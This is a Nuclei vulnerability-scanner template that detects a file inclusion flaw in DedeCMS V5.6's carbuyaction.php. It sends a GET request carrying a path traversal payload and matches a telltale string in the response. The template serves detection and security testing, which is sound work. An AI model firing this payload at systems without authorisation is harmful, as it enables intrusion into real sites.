# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: dedecms-carbuyaction-fileinclude
info:
  name: DedeCmsV5.6 Carbuyaction Fileinclude
  author: pikpikcu
  severity: high
  reference: https://www.cnblogs.com/milantgh/p/3615986.html
  tags: dedecms
http:
  - method: GET
    path:
      - '{{BaseURL}}/plus/carbuyaction.php?dopost=return&code=../../'
    headers:
      Cookie: code=cod
    redirects: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Cod::respond()"
        part: body
        condition: and
      - type: status
        status:
          - 200
